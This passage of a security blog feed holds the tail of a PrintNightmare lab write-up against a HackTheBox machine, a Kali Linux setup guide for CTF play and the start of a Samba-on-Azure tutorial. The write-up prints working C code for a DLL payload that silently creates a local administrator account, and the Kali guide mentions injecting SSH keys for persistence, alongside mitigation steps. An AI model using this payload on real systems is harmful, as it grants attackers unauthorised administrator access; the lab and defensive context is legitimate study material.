</span><span class="c1">// compile: x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
</span><span class="c1"></span><span class="cp">#include</span><span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">Entry</span> <span class="p">(){</span> <span class="c1">//Default function that is executed when the DLL is loaded
</span><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cmd.exe /c net user iamf &lt;password&gt; /add&#34;</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cmd.exe /c net localgroup administrators iamf /add&#34;</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">){</span>
        <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
            <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">Entry</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
        <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
        <span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The code can be compiled from Linux using <code>mingw-w64</code> compiler ( <code>sudo apt install mingw-w64</code>). I will run the following command to compile the DLL.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
</code></pre></div><p><del>I don&rsquo;t demo this DLL since the process and the result are the same 😅</del>.</p>
<p>On Bastion, although the add user payload can evade the AV, I&rsquo;m unable to login using the created user via WinRM. However,  <code>impacket-psexec</code> will do.</p>
<p><div class="img-container"><img src="imgs/image-20210730191657750.png" alt="image-20210730191657750"  /></div>
</p>
<p>Further investigation, I found out that  <code>Invoke-Command</code> from localhost is allowed.</p>
<p><div class="img-container"><img src="imgs/image-20210730192152601.png" alt="image-20210730192152601"  /></div>
</p>
<p>So, I guess the WinRM was configured to only allow admin account for remote access. I couldn&rsquo;t get the &ldquo;right&rdquo; keywords to <em>google</em> this. Below are what I&rsquo;ve tried so far:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ winrm get winrm/config
$ winrm get winrm/config/listener
$ <span class="o">(</span>Get-PSSessionConfiguration -Name Microsoft.PowerShell<span class="o">)</span>.Permission
$ HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\P</span>olicies<span class="se">\S</span>ystem
$ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\P</span>olicies<span class="se">\S</span>ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d <span class="m">1</span> /f
</code></pre></div><h2 id="mitigation">Mitigation</h2>
<p>Microsoft provided <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">two options</a> as workarounds to mitigate PrintNightmare:</p>
<ul>
<li>Disable Print Spooler service</li>
<li>Disable inbound remote printing through Group Policy.</li>
</ul>
<p>Also, it is recommended to install <a href="https://support.microsoft.com/topic/31b91c02-05bc-4ada-a7ea-183b129578a7">KB5005010</a> patch.  As for the second option, I have no idea to work with that from CLI, so I will demo the first option.</p>
<h4 id="disable-print-spooler-service">Disable Print Spooler Service</h4>
<p>First, determine if the Print Spooler Service is running by using  <code>Get-Service -Name Spooler</code> in PowerShell. If the service is running, stop and disable it by running the following commands in PowerShell consecutively.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ Stop-Service -Name Spooler -Force
$ Set-Service -Name Spooler -StartupType Disabled
</code></pre></div><p>For demo, I will apply these on Bastion.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\&gt;</span> Get-Service -Name Spooler 

Status   Name               DisplayName
------   ----               -----------
Running  Spooler            Print Spooler


*Evil-WinRM* PS C:<span class="se">\&gt;</span> Stop-Service -Name Spooler -Force
*Evil-WinRM* PS C:<span class="se">\&gt;</span> Set-Service -Name Spooler -StartupType Disabled
</code></pre></div><p>After disabling Spooler service, I ran the exploit again, but this time, it returned a &ldquo;Connection Failed&rdquo; message.</p>
<p><div class="img-container"><img src="imgs/image-20210717133929589.png" alt="image-20210717133929589"  /></div>
</p>
<p>So, the conclusion is it worked! But, the downside is you loss the ability to print from both local and remote 🙃.</p>
<p>For more detailed mitigation, you can go to <a href="https://github.com/LaresLLC/CVE-2021-1675">this GitHub repo</a>.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675</a></li>
<li><a href="https://unit42.paloaltonetworks.com/cve-2021-34527-printnightmare/">https://unit42.paloaltonetworks.com/cve-2021-34527-printnightmare/</a></li>
<li><a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></li>
<li><a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></li>
<li><a href="https://github.com/LaresLLC/CVE-2021-1675">https://github.com/LaresLLC/CVE-2021-1675</a></li>
<li><a href="https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point">https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point</a></li>
<li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>My Kali Linux Setup for Playing HackTheBox</title>
      <link>https://fahmifj.github.io/blog/my-kali-linux-setup-for-playing-hackthebox/</link>
      <pubDate>Fri, 09 Jul 2021 07:45:19 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/my-kali-linux-setup-for-playing-hackthebox/</guid>
      <description>After using Kali 2019.4 for almost 2 years, I finally upgraded my Kali to 2021.2. I wanted to try Parrot or build a weaponized version of Ubuntu , but because I like simplicity, I decided to use Kali again 😄 //slap.
In this post, I&amp;rsquo;d like to share my Kali Linux setup for playing HackTheBox. I guess it is applicable for TryHackMe, VulnHub or other boot2root platform, too (I hope).</description>
      <content:encoded><![CDATA[<p>After using Kali 2019.4 for almost 2 years, I finally upgraded my Kali to 2021.2. I wanted to try Parrot or build a <em>weaponized</em> version of Ubuntu , but because I like simplicity, I decided to use Kali again 😄 <em>//slap</em>.</p>
<p>In this post, I&rsquo;d like to share my Kali Linux setup for playing HackTheBox. I guess it is applicable for TryHackMe, VulnHub or other boot2root platform, too (I hope).</p>
<p><strong>[Update 29-07-2021]</strong></p>
<ul>
<li>Update sudo alias</li>
</ul>
<h2 id="display-ip-address-in-prompt">Display IP Address in Prompt</h2>
<p>Adding IP address in your prompt would be really helpful as it lets you copy the IP faster for reverse shell. To do so, we&rsquo;ll need to modify the <code>.zshrc</code> file. But, before performing any modification, consider to make a backup of your original file using the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cp ~/.zshrc<span class="o">{</span>,.bak<span class="o">}</span> 
</code></pre></div><p>Also, I usually put any customization at the top of the <code>.zshrc</code> file wrapped between two comments, for example:</p>
<pre><code># START CUSTOM
...[custom script here]
# END CUSTOM
</code></pre><p>If all set, add the following function to your <code>.zshrc</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="k">function</span> get_ip<span class="o">(){</span>
   <span class="c1"># It can be thm or htb IP</span>
   <span class="nv">tunnel_ip</span><span class="o">=</span><span class="sb">`</span>ifconfig tun0 2&gt;/dev/null <span class="p">|</span> grep netmask <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span><span class="sb">`</span> 
   <span class="c1"># Use eth0 as default IP,</span>
   <span class="nv">default_ip</span><span class="o">=</span><span class="sb">`</span>ifconfig eth0 2&gt;/dev/null <span class="p">|</span> grep netmask <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span><span class="sb">`</span>
   <span class="k">if</span> <span class="o">[[</span> <span class="nv">$tunnel_ip</span> <span class="o">==</span> *<span class="s2">&#34;10.&#34;</span>* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
      <span class="nb">echo</span> <span class="nv">$tunnel_ip</span>
   <span class="k">else</span>
      <span class="nb">echo</span> <span class="nv">$default_ip</span>
   <span class="k">fi</span>
<span class="o">}</span>
</code></pre></div><p>Then, find the following lines:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">...
<span class="k">case</span> <span class="s2">&#34;</span><span class="nv">$PROMPT_ALTERNATIVE</span><span class="s2">&#34;</span> in
        twoline<span class="o">)</span>
...
</code></pre></div><p>Under these lines,  replace the entire <code>PROMPT</code> variable with the following line:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">PROMPT=$&#39;%F{%(#.blue.green)}┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n$prompt_symbol%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]-%B%F{152}[`get_ip`]%b%f%F{%(#.blue.green)}\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} &#39;
</code></pre></div><p>Reopen your terminal or type one of the following commands in the terminal.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ zsh
$ <span class="nb">source</span> ~/.zshrc
</code></pre></div><p>And done.</p>
<p><div class="img-container"><img src="imgs/image-20210709054914243.png" alt="image-20210709054914243"  /></div>
</p>
<h2 id="openvpn-connection">OpenVPN Connection</h2>
<p>For VPN, it&rsquo;s tiring when you have to type <code>$ openvpn /path/to/config/file.ovpn</code> each time you want to connect to the HTB/THM network. To make thing easier, we can create a folder called <code>.ovpnconfig</code> in the home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ mkdir -p ~/.ovpnconfig
</code></pre></div><p>Then put all of your OpenVPN configuration files into this <code>.ovpnconfig</code> folder.</p>
<p><div class="img-container"><img src="imgs/image-20210709063528132.png" alt="image-20210709063528132"  /></div>
</p>
<p>Finally, add some aliases into your <code>.zshrc</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">alias</span> <span class="nv">htbon</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/htb-sg.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">htbfort</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/htb-fortress.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">htbrel</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/htb-release.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">thmon</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/thm.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">thmwreath</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/thm-wreath.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">kvpn</span><span class="o">=</span><span class="s1">&#39;pkill openvpn&#39;</span>
</code></pre></div><p>Now we can type <code>$ htbon</code> or <code>$ thmon</code> in the command prompt to connect to the VPN.  Want to turn off the VPN? Simply type <code>$ kvpn</code> !</p>
<h2 id="sudo-with-alias">Sudo with Alias</h2>
<p>In the newer Kali Linux, the only problem is that <code>openvpn</code> must be executed with <code>sudo</code> . Therefore, you&rsquo;ve to add the following <code>sudo</code> alias.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"># Source: https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background
alias sudo=&#39;sudo -v; [ $? ] &amp;&amp; sudo &#39;
</code></pre></div><ul>
<li><code>sudo -v</code> will authenticate the user first.</li>
<li><code>[ $? ] &amp;&amp; sudo </code> will check if the previous command (separated by semi-colon) return with success (value of 0), if yes run <code>sudo</code> again.</li>
</ul>
<p>This time, we can run sudo command with aliases.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ sudo &lt;alias-command&gt;
$ sudo htbon
$ sudo thmon
$ sudo kvpn
</code></pre></div><p>An alternative for sudo to work with alias is using sudo with no passwd.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ sudo visudo /etc/sudoers.d/kali
</code></pre></div><p>Then add the following line.</p>
<pre><code>kali  ALL=NOPASSWD: ALL
</code></pre><p>After that, change the previous sudo alias to this one</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">alias sudo=&#39;sudo &#39;
</code></pre></div><h2 id="tools-transfer">Tools Transfer</h2>
<p>Just like the OpenVPN files, I like to keep the essential tools to be centralized in one folder and so it can be hosted immediately. Again, we can create a folder called <code>tools</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ mkdir -p ~/tools
</code></pre></div><p>Put your tools inside the folder. The following are some of the tools that I think to be essential (including web-shell).</p>
<p><div class="img-container"><img src="imgs/image-20210709065944915.png" alt="image-20210709065944915"  /></div>
</p>
<p>Next, add another alias to host these tools immediately with one command, feel free to create alias for yourself. Mine called <code>hostit</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">alias</span> <span class="nv">hostit</span><span class="o">=</span><span class="s1">&#39;python3 -m http.server -d ~/tools 8000&#39;</span>
</code></pre></div><p>If you watch <a href="https://www.youtube.com/c/ippsec/videos">ippsec</a>, he prefers keeping the tools with the associated pwned machines (in <code>www</code> directory). So it&rsquo;s up to you.</p>
<h2 id="note-template">Note Template</h2>
<p>My current note template is available on <a href="https://github.com/fahmifj/HackTheBox-notes/tree/main/machines/note-template">GitHub</a>. I&rsquo;m using the following function to recreate the directory structure:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="k">function</span> mknote<span class="o">(){</span>
  mkdir nmap gobuster loot logs exploits ssh-keys post-exploits
<span class="o">}</span>
</code></pre></div><ul>
<li>
<p><strong>nmap:</strong> each nmap scan goes here.</p>
</li>
<li>
<p><strong>gobuster:</strong> each gobuster scan goes here.</p>
</li>
<li>
<p><strong>loot:</strong> each interesting file for further analysis goes here.</p>
</li>
<li>
<p><strong>logs:</strong> If you like to log your activity with <code>$ script</code> , put them here.</p>
</li>
<li>
<p><strong>exploits:</strong> exploit script goes here.</p>
</li>
<li>
<p><strong>ssh-keys:</strong> obtained ssh-key goes here, not loot.</p>
</li>
<li>
<p><strong>post-exploits:</strong> post-compromise loot goes here.</p>
</li>
</ul>
<p>Usage is simple:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ <span class="nb">cd</span> htb-machine-folder/
$ mknote
$ tree
.
├── exploits
├── gobuster
├── logs
├── loot
├── nmap
├── post-exploits
└── ssh-keys
</code></pre></div><h2 id="ssh-configuration">SSH Configuration</h2>
<p>I have always use a separate SSH keys for CTF. My SSH key for CTF is using ed25519. You can create one using the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ssh-keygen -a <span class="m">100</span> -t ed25519 -f ~/.ssh/ctf_ssh
</code></pre></div><p>After that, register your private key to SSH agent.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ <span class="nb">eval</span> <span class="s2">&#34;</span><span class="k">$(</span>ssh-agent -s<span class="k">)</span><span class="s2">&#34;</span>
$ ssh-add ~/.ssh/ctf_ssh
</code></pre></div><p>Since HackTheBox machine starts with IP address of <code>10.10.*</code>, add these lines to your SSH config (<code>~/.ssh/config</code>). Create one if you don&rsquo;t have it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Host 10.10.*
  IdentityFile ~/.ssh/ctf_ssh
</code></pre></div><p>With the config above, whenever I injected my public key  (<code>/.ssh/ctf_ssh.pub</code>)  to HackTheBox machine for persistence access*, I can login by simply typing <code>$ ssh machine-name@hostname</code> or <code>$ ssh machine-name@ip</code>. I don&rsquo;t have to specify <code>-i /path/to/ssh/private/key</code> anymore.</p>
<blockquote>
<p>*Read more at <a href="https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/">Linux Backdoors</a> post.</p>
</blockquote>
<h2 id="qterminal-configuration">QTerminal Configuration</h2>
<p>Unfortunately I&rsquo;m not a tmux user here. Tmux is rich in features, but I&rsquo;m not comfortable with its prefix key. So far, I&rsquo;ve always used the default QTerminal application and leveraged its shortcut feature to &lsquo;navigate&rsquo; a slightly faster in terminal.</p>
<p>If you&rsquo;re a Windows Terminal user, you&rsquo;ll familiar with some of these shortcuts:</p>
<ul>
<li><strong><code>ALT + Arrows</code></strong>: Move cursor in subterminal</li>
<li><strong><code>CTRL + TAB</code></strong>: Navigate between tabs</li>
<li><strong><code>CTRL + Arrow Left</code></strong>:  Previous tab</li>
<li><strong><code>CTRL + Arrow Right</code></strong>: Next tab</li>
<li><strong><code>CTRL + N</code></strong> : New terminal tab</li>
<li><strong><code>CTRL + SHIFT + W</code></strong> : Close current subterminal</li>
<li><strong><code>CTRL + SHIFT + =</code></strong> : Split terminal vertically</li>
<li><strong><code>CTRL + SHIFT + -</code></strong> : Split terminal horizontally</li>
<li><strong><code>CTRL + SHIFT + F</code></strong> : Open search bar in terminal</li>
<li><strong><code>CTRL + =</code></strong> : Zoom in</li>
<li><strong><code>CTRL + -</code></strong> : Zoom out</li>
</ul>
<p>For me, the only limitation here is that there is no shortcut for resizing a subterminal.</p>
<h2 id="all-in-one-with-oh-my-zsh-plugin">All in One with Oh My Zsh Plugin</h2>
<p>If you&rsquo;re a <a href="https://ohmyz.sh/#install">Oh My Zsh</a> user like me, we can add these configurations (excluding SSH and QTerminal configurations) into a custom plugin.</p>
<p>Save the following script to  <code>/home/&lt;username&gt;/.oh-my-zsh/custom/plugins/ctf/ctf.plugin.zsh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span>
<span class="k">function</span> get_ip<span class="o">(){</span>
   <span class="c1"># It can be thm or htb IP</span>
   <span class="nv">tunnel_ip</span><span class="o">=</span><span class="sb">`</span>ifconfig tun0 2&gt;/dev/null <span class="p">|</span> grep netmask <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span><span class="sb">`</span> 
   <span class="c1"># Use eth0 as default IP,</span>
   <span class="nv">default_ip</span><span class="o">=</span><span class="sb">`</span>ifconfig eth0 2&gt;/dev/null <span class="p">|</span> grep netmask <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span><span class="sb">`</span>
   <span class="k">if</span> <span class="o">[[</span> <span class="nv">$tunnel_ip</span> <span class="o">==</span> *<span class="s2">&#34;10.&#34;</span>* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
      <span class="nb">echo</span> <span class="nv">$tunnel_ip</span>
   <span class="k">else</span>
      <span class="nb">echo</span> <span class="nv">$default_ip</span>
   <span class="k">fi</span>
<span class="o">}</span>

<span class="k">function</span> mknote<span class="o">(){</span>
  mkdir nmap gobuster loot logs exploits ssh-keys dump post-exploits
<span class="o">}</span>

<span class="c1"># https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background</span>
<span class="nb">alias</span> <span class="nv">sudo</span><span class="o">=</span><span class="s1">&#39;sudo -v; [ $? ] &amp;&amp; sudo &#39;</span>
<span class="nb">alias</span> <span class="nv">htbon</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/htb-sg.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">htbfort</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/htb-fortress.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">htbrel</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/htb-release.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">thmon</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/thm.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">thmwreath</span><span class="o">=</span><span class="s1">&#39;openvpn ~/ovpnconfig/thm-wreath.ovpn 1&gt;/dev/null &amp;&#39;</span>
<span class="nb">alias</span> <span class="nv">kvpn</span><span class="o">=</span><span class="s1">&#39;pkill openvpn&#39;</span>
<span class="nb">alias</span> <span class="nv">hostit</span><span class="o">=</span><span class="s1">&#39;python3 -m http.server -d ~/tools 8000&#39;</span>
</code></pre></div><blockquote>
<p>If you want to include my note template as well, I&rsquo;ve prepared <a href="https://github.com/fahmifj/HackTheBox-notes/blob/main/machines/note-template/ctf.plugin.zsh">this one</a> with note template embedded in <code>mknote</code> function.</p>
</blockquote>
<p>The next step is depending on your theme, I use a theme called <code>robbyrussell</code>. I created a copy of the theme in <code> /home/kali/.oh-my-zsh/custom/themes/robbyrussell.zsh-theme</code> and modified the theme to display prompt in two line with IP address. The modified version as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">NEWLINE=$&#39;\n$&#39; 
PROMPT=&#39;%(?:%{$fg_bold[green]%}→:%{$fg_bold[red]%}→)&#39;
PROMPT+=&#39; %F{4}%n@%m %{$fg[cyan]%}«%c»%{$reset_color%}&#39;
PROMPT+=&#39; %B%F{152}«$(get_ip)»%f%b $(git_prompt_info)&#39;
PROMPT+=&#34;%F{31}${NEWLINE} %f&#34;

ZSH_THEME_GIT_PROMPT_PREFIX=&#34;%{$fg_bold[blue]%}git:(%{$fg[red]%}&#34;
ZSH_THEME_GIT_PROMPT_SUFFIX=&#34;%{$reset_color%} &#34;
ZSH_THEME_GIT_PROMPT_DIRTY=&#34;%{$fg[blue]%}) %{$fg[yellow]%}✗&#34;
ZSH_THEME_GIT_PROMPT_CLEAN=&#34;%{$fg[blue]%})&#34;
</code></pre></div><p>Finally, load the <code>ctf</code> plugin we created in <code>.zshrc</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...[SNIP]...
# Which plugins would you like to load?
# Standard plugins can be found in $ZSH/plugins/
# Custom plugins may be added to $ZSH_CUSTOM/plugins/
# Example format: plugins=(rails git textmate ruby lighthouse)
# Add wisely, as too many plugins slow down shell startup.
plugins=(git ctf)

...[SNIP]...
</code></pre></div><p>Restart your terminal and we&rsquo;re done.</p>
<p><div class="img-container"><img src="imgs/image-20210711221808834.png" alt="image-20210711221808834"  /></div>
</p>
<p>And that&rsquo;s all for this post!</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54</a></li>
<li><a href="https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background">https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Setup a Samba Server in Azure and Make It Accessible Over Internet</title>
      <link>https://fahmifj.github.io/blog/setup-a-samba-server-in-azure/</link>
      <pubDate>Sun, 04 Jul 2021 19:45:21 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/setup-a-samba-server-in-azure/</guid>
      <description>Last month, I was asked to setup a Samba/SMB server that is accessible over the Internet. Because it will only be used temporarily, I decided to use an Azure Virtual Machine (VM) instead of buying a dedicated VPS.
In this post, I’ll share my documentation on how to setup a Samba server in Azure.
Before proceeding further, I&amp;rsquo;ll state that:
 Exposing an SMB Server directly to the Internet is not recommended, or not considered to be &amp;lsquo;best practice&amp;rsquo;.</description>
      <content:encoded><![CDATA[<p>Last month, I was asked to setup a Samba/SMB server that is accessible over the Internet. Because it will only be used temporarily, I decided to use an Azure Virtual Machine (VM) instead of buying a dedicated VPS.</p>
<p>In this post, I’ll share my documentation on how to setup a Samba server in Azure.</p>
<p>Before proceeding further, I&rsquo;ll state that:</p>
<blockquote>
<p>Exposing an SMB Server directly to the Internet is not recommended, or not considered to be &lsquo;best practice&rsquo;. The safest way to make it accessible over the Internet is by setting up a VPN server and putting the SMB inside the VPN network.</p>
</blockquote>
<h4 id="goals-and-outcomes">Goals and Outcomes</h4>
<p>The goal here is exactly the same as what’s written in the title, but by the end of this post, you will be able to:</p>
<ul>
<li>Deploy an Ubuntu server in Azure</li>
<li>Setup and Configure a Samba server</li>
<li>Exposing Samba server over Internet</li>
</ul>
<h4 id="prerequisites">Prerequisites</h4>
<p>The one and only prerequisite is:</p>
<ul>
<li>Azure Account</li>
</ul>
<p>Also, since this post won&rsquo;t be detailed step by step, I&rsquo;ll assume that you have:</p>
<ul>
<li>Basic knowledge of Azure, at least menu navigation and creating a resource group.</li>
<li>Basic knowledge of Linux</li>
</ul>
<p>Let&rsquo;s jump in!</p>
<h2 id="vm-configuration--deploy">VM Configuration &amp; Deploy</h2>
<p>At this step, I already have a resource group called <code>IAMF_SMB-TEST</code> and I&rsquo;ll be creating a VM instance inside this resource. It&rsquo;s a small server used by 4-5 users, so B1s will be enough. You&rsquo;re free to customize the VM.</p>
<p>The VM details of mine can be seen in the following image:</p>
<p><div class="img-container"><img src="imgs/image-20210513170545346.png" alt="image-20210513170545346"  /></div>
</p>
<p>For authentication to the server, I&rsquo;ll be using an SSH public key here instead of a password. The account for server administration is called <code>azure-smb</code>. Since the authentication is SSH, this VM will have an SSH port open publicly (internet).</p>
<p><div class="img-container"><img src="imgs/image-20210513170638603.png" alt="image-20210513170638603"  /></div>
</p>
<p>In the following section, I&rsquo;ll use a standard SSD and leave the other settings at their defaults.</p>
<p><div class="img-container"><img src="imgs/image-20210513170710958.png" alt="image-20210513170710958"  /></div>
</p>
<p>In the <strong>Networking</strong> section, I&rsquo;ll just create a new virtual network. See the following image for details:</p>
<p><div class="img-container"><img src="imgs/image-20210513170824172.png" alt="image-20210513170824172"  /></div>
</p>
<p>In the <strong>Management</strong> section, because it will be temporary, I&rsquo;ll just disable the boot diagnostics.</p>
<p><div class="img-container"><img src="imgs/image-20210513171009570.png" alt="image-20210513171009570"  /></div>
</p>
<p>I&rsquo;ll leave the <strong>Advanced</strong> with the default settings and skip the <strong>Tags</strong> section.</p>
<p>The last section is <strong>Review + Create</strong>, which basically reviews the VM configuration. After I finish the review, I&rsquo;ll press the <strong>Create</strong> button.</p>
<p><div class="img-container"><img src="imgs/image-20210513171153896.png" alt="image-20210513171153896"  /></div>
</p>
<p>When the <strong>Create</strong> button is clicked, the VM will be automatically deployed.</p>
<p><div class="img-container"><img src="imgs/image-20210513171501031.png" alt="image-20210513171501031"  /></div>
</p>
<h3 id="test-ssh-login">Test SSH Login</h3>
<p>The next step is to login to the deployed VM instance via SSH using the previously created username and key/password. The public IP of the VM instance can be found at the <code>Dashboard</code> &gt; <code>RESOURCE_GROUP_NAME</code> &gt; <code>PUBLIC_IP_NAME</code>. In my case, it is <code>Dashboard</code> &gt; <code>IAMF_SMB-TEST</code> &gt; <code>smb-server-ip</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ssh -i private_key azure-smb@PUBLIC_IP_ADDRESS
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210513171606268.png" alt="image-20210513171606268"  /></div>
</p>
<h2 id="samba-configuration">Samba Configuration</h2>
<h3 id="installation-and-initial-setup">Installation and Initial Setup</h3>
<p>First thing first, let&rsquo;s update the repository list.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo apt update
</code></pre></div><p>After that, install <code>Samba</code> with the following command.</p>
